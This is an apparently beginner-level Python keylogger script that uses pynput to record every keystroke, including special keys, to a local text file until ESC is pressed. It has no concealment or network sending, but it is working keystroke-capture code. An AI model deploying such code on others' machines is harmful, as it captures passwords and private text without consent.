# Storing the keystrokes in a text file
# File Handling: (r)ead,(w)rite,(e)xecute, (a) append, a+ append&readmode

from pynput import keyboard

# Create a log file; captures keystrokes being stored
log_file = "Keylog.txt"

count = 0
keys = []

# Try block; executes the code inside the block
#'with' keyword - release memory/resoucres automatically
#Define function to write the captured keys to a file
def write_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            if hasattr(key, 'char'):
                # Handles alphanumeric characters
                f.write(key.char)
            else:
                # Handles special keys
                if key == keyboard.Key.space:
                    f.write(" ") # Represents space
                elif key == keyboard.Key.enter:
                    f.write("\n") #Represents newline
                elif key == keyboard.Key.tab:
                    f.write("\t") #represents Tab key
                elif key == keyboard.Key.shift:
                    f.write("[SHIFT]") # Represents shift key
                elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                    f.write("[CTRL]")  # Represents Ctrl key
                elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                    f.write("[ALT]")  # Represents Alt key
                else:
                    f.write(f"[{key}]")  # Represents other special keys

# Define the function that will call when key is pressed
def on_press(key):
    global count, keys
    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = [] #clear key list
    
    #stop listener if "ESC" key is pressed
    if key == keyboard.Key.esc:
        return False 

# set up & start keyboard lisetener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

